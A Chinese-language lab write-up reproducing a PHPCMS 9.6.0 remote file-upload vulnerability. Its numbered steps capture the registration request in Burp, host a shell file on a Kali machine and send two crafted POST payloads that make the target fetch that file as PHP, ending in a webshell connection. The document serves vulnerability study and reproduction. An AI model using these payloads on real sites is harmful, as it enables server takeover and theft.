# PHPcms v9.6.0 文件上传漏洞

## 一、漏洞描述

​		PHPCMS 9.6.0版本中的libs/classes/attachment.class.php文件存在漏洞,该漏洞源于PHPCMS程序在下载远程/本地文件时没有对文件的类型做正确的校验。远程攻击者可以利用该漏洞上传并执行任意的PHP代码。

## 二、漏洞影响版本

PHPCMS 9.6.0

phpcms v9.6.0下载地址：http://down.chinaz.com/soft/28180.html

## 三、漏洞环境搭建

略

注：PHP版本=v7.3使用switch中使用continue会出现警告错误。（解决措施：v5.2<php<v7.3）

![image-20210322235123330](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322235123.png)

## 四、漏洞复现

1.本地搭建phpcmsv9.0

2.文件上传漏洞出现在注册页面，进入注册页面，填入所需要的信息

![image-20210322112259819](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322112306.png)

3.使用burp进行抓包（在post请求中可以看到生日写入的字段是info[birthday]，猜测info还有其他对应的值）

![image-20210322112411545](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322112411.png)

4.在另一个系统（kali），开启web服务，然后在web根目录中创建一个txt文件

![image-20210322232806814](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322232806.png)

![image-20210322232647024](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322232647.png)

5.对txt文件进行访问（注：因为是远程上传文件漏洞，因此txt文件要先可以被访问）

![image-20210322232835711](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210322232835.png)

6.构建poc（注：构建poc时有几个注意点）

- modelid取值（modelid取值有1，2，3，10，11，但是10不可以（info[content]需要调用editor函数，modelid为10不存在这个函数））
- info[birthday]修改为info[content]
- 每次发送数据包要修改username，password，email的值

```txt
siteid=1&modelid=11&username=13&password=131111&pwdconfirm=131111&email=131111%40163.com&nickname=13&info[content]=<img%20src=http://192.168.112.147/phpinfo.txt?.php#.jpg>&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=
```

![image-20210323075948084](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210323075948.png)

7.可以看到返回包里包含了文件上传的路径

![image-20210323080103638](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210323080103.png)

8.浏览器访问，php代码被执行

![image-20210323080441506](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210323080441.png)

9.构造POC,上传一句话

```txt
siteid=1&modelid=11&username=15&password=151111&pwdconfirm=151111&email=151111%40163.com&nickname=15&info[content]=<img%20src=http://192.168.112.147/shell.txt?.php#.jpg>&dosubmit=%E5%90%8C%E6%84%8F%E6%B3%A8%E5%86%8C%E5%8D%8F%E8%AE%AE%EF%BC%8C%E6%8F%90%E4%BA%A4%E6%B3%A8%E5%86%8C&protocol=
```

![image-20210323080658038](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210323080658.png)

10、菜刀连接

![image-20210323080941919](https://yglf.oss-cn-hangzhou.aliyuncs.com/img/20210323080942.png)

## 五、源码解析

详细解析：https://www.jianshu.com/p/204698667fa2?tdsourcetag=s_pcqq_aiomsg